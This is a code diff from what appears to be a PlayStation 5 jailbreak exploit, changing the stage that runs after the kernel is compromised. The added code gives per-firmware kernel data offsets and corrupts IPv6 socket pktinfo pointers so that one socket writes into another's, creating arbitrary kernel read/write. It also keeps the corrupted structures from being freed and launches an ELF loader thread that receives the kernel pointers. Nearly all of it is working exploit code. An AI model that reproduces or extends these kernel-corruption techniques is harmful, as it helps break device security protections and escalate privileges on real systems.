@@ -77,55 +77,144 @@ function patch_proc(p, kp) {
   kview(eboot_segments).setBInt(0x10, -1, true); // size
 }
 
-async function post_jailbreak() {
-  const kexp_u8 = await load_file('src/ps5/kexp.bin');
-  const elfldr_u8 = await load_file('src/ps5/elfldr.elf');
+function kernel_data_base() {
+  const deltas = {
+    6: 0xc60000,
+    7: 0xc50000,
+    8: 0xc70000,
+    9: 0xca0000,
+    10: 0xcc0000,
+    11: 0xd30000,
+    12: 0xd50000,
+  };
 
-  const kexp_addr = kexp_u8.buffer.data();
-  const kexp_page_size = kexp_u8.length.alignUp(PAGE_SIZE);
+  let delta = version.major === 13 ? (version.minor >= 0x60 ? 0xcc0000 : 0xcb0000) : deltas[version.major];
 
-  logger.debug(`kexp_addr: ${kexp_addr}`);
-  logger.debug(`kexp_page_size: ${kexp_page_size.hex()}`);
-
-  const elfldr_addr = elfldr_u8.buffer.data();
-  const elfldr_size = elfldr_u8.length;
-
-  logger.debug(`elfldr_addr: ${elfldr_addr}`);
-  logger.debug(`elfldr_size: ${elfldr_size.hex()}`);
-
-  const exec_fd = fn.jitshm_create.invoke(0, kexp_page_size, 7);
-  logger.debug(`exec_fd: ${exec_fd}`);
-
-  const map_addr = fn.mmap.invoke(0, kexp_page_size, 7, 0, exec_fd, 0);
-  logger.debug(`map_addr: ${map_addr}`);
-
-  if (map_addr.eq(-1)) {
-    throw new SyscallError(`Unable to map memory with size ${kexp_page_size.hex(false)}`);
+  if (delta === undefined) {
+    throw new Error(`${version} has no kernel data base offset !!`);
   }
 
-  mem.copy(map_addr, kexp_addr, kexp_u8.length);
+  return kernel_base.add(delta);
+}
+
+function make_kernel_rw_sockets() {
+  const pair_addr = mem.alloc(8);
+
+  const master_sock = make_socket(AF_INET6, SOCK_DGRAM, IPPROTO_UDP);
+  const victim_sock = make_socket(AF_INET6, SOCK_DGRAM, IPPROTO_UDP);
+
+  const master_buf = mem.alloc(0x14);
+  const victim_buf = mem.alloc(0x14);
+
+  if (fn.setsockopt.invoke(master_sock, IPPROTO_IPV6, IPV6_PKTINFO, master_buf, 0x14) === -1) {
+    throw new SyscallError(`Unable to set socket option for fd ${master_sock} !!`);
+  }
+
+  if (fn.setsockopt.invoke(victim_sock, IPPROTO_IPV6, IPV6_PKTINFO, victim_buf, 0x14) === -1) {
+    throw new SyscallError(`Unable to set socket option for fd ${victim_sock} !!`);
+  }
+
+  // Keep the socket structures alive after their fds are released, so the
+  // corrupted pktinfo pointers are never freed by the kernel.
+  fhold(fget(master_sock));
+  fhold(fget(victim_sock));
+
+  const master_pktopts = get_in6p_outputopts(master_sock);
+  const victim_pktopts = get_in6p_outputopts(victim_sock);
+
+  if (master_pktopts.eq(0) || victim_pktopts.eq(0)) {
+    throw new Error('Unable to resolve socket pktopts !!');
+  }
+
+  // Overlap the pktinfo structures so that writes through the master socket
+  // land in the victim socket's ip6po_pktinfo pointer.
+  kview(master_pktopts).setBInt(0x10, victim_pktopts.add(0x10), true);
+
+  arw.view(pair_addr).setInt32(0, master_sock, true);
+  arw.view(pair_addr).setInt32(4, victim_sock, true);
+
+  return pair_addr;
+}
+
+/**
+ * Resolve a libkernel syscall wrapper for the payload runtime. The runtime
+ * probes it as a callable function, then reuses the same pointer offset by
+ * 0xa as the raw syscall instruction, so any wrapper works, e.g. getpid.
+ */
+function resolve_syscall_wrapper() {
+  if (!fn.hasOwnProperty('dlsym')) {
+    fn.dlsym = new NativeFunction(0x24f, 'number');
+  }
+
+  const addr_out = mem.alloc(8);
+
+  try {
+    if (fn.dlsym.invoke(0x2001, 'getpid', addr_out) !== 0) {
+      throw new Error('Unable to resolve getpid !!');
+    }
+
+    const addr = arw.view(addr_out).getBInt(0, true);
+    if (addr.eq(0)) {
+      throw new Error('Unable to resolve getpid !!');
+    }
+
+    return addr;
+  } finally {
+    mem.free(addr_out);
+  }
+}
+
+async function post_jailbreak() {
+  await load_script('src/elfldr.js');
+
+  const elfldr = await load_elf('src/ps5/elfldr.elf');
+
+  const [read_fd, write_fd] = make_pipe();
+  const rwpipe = mem.alloc(8);
+
+  arw.view(rwpipe).setInt32(0, read_fd, true);
+  arw.view(rwpipe).setInt32(4, write_fd, true);
+
+  refresh_fdt_ofiles();
+
+  const rwpair = make_kernel_rw_sockets();
+
+  // Opening sockets above may have grown and reallocated the fd table.
+  refresh_fdt_ofiles();
+
+  const pipe_fp = fget(read_fd);
+  logger.debug(`pipe_fp: ${pipe_fp}`);
+
+  const pipe_addr = kview(pipe_fp).getBInt(0, true);
+
+  if (pipe_addr.eq(0)) {
+    throw new Error(`Unable to resolve pipe address for fd ${read_fd} !!`);
+  }
+
+  logger.debug(`pipe_addr: ${pipe_addr}`);
+
+  const syscall_wrapper = resolve_syscall_wrapper();
+
+  const payload_args = mem.alloc(0x30);
+  const payload_out = mem.alloc(8);
+
+  arw.view(payload_args).setBInt(0x00, syscall_wrapper, true);
+  arw.view(payload_args).setBInt(0x08, rwpipe, true);
+  arw.view(payload_args).setBInt(0x10, rwpair, true);
+  arw.view(payload_args).setBInt(0x18, pipe_addr, true);
+  arw.view(payload_args).setBInt(0x20, kernel_data_base(), true);
+  arw.view(payload_args).setBInt(0x28, payload_out, true);
 
   const pthread_addr_addr = mem.alloc(8);
-  const payload_args = mem.alloc(0x28);
 
-  logger.debug(`payload_args: ${payload_args}`);
-
-  arw.view(payload_args).setInt32(0x00, master_pipe[0], true);
-  arw.view(payload_args).setInt32(0x04, master_pipe[1], true);
-  arw.view(payload_args).setInt32(0x08, victim_pipe[0], true);
-  arw.view(payload_args).setInt32(0x0c, victim_pipe[1], true);
-  arw.view(payload_args).setBInt(0x10, allproc, true);
-  arw.view(payload_args).setBInt(0x18, elfldr_addr, true);
-  arw.view(payload_args).setBInt(0x20, elfldr_size, true);
-
-  if (fn.pthread_create.invoke(pthread_addr_addr, 0, map_addr, payload_args)) {
-    throw new Error('Unable to create bin thread !!');
+  if (fn.pthread_create.invoke(pthread_addr_addr, 0, elfldr.entry, payload_args)) {
+    throw new Error('Unable to create elfldr thread !!');
   }
 
   const pthread_addr = arw.view(pthread_addr_addr).getBInt(0, true);
   const pthread_id = arw.view(pthread_addr).getBInt(0, true);
 
-  logger.info(`Created bin thread with id ${pthread_id} !!`);
+  logger.info(`Created elfldr thread with id ${pthread_id} !!`);
 
   const ret_addr = mem.alloc(8);
 
@@ -135,15 +224,7 @@ async function post_jailbreak() {
 
   const ret = arw.view(ret_addr).getInt32(0, true);
 
-  logger.info(`bin returned ${ret} !!`);
-
-  if (fn.munmap.invoke(map_addr, kexp_page_size)) {
-    throw new SyscallError(`Unable to munmap ${map_addr} !!`);
-  }
-
-  if (fn.close.invoke(exec_fd) === -1) {
-    throw new SyscallError(`Unable to close fd ${exec_fd} !!`);
-  }
+  logger.info(`elfldr returned ${ret} !!`);
 
   mem.free(pthread_addr_addr);
   mem.free(payload_args);
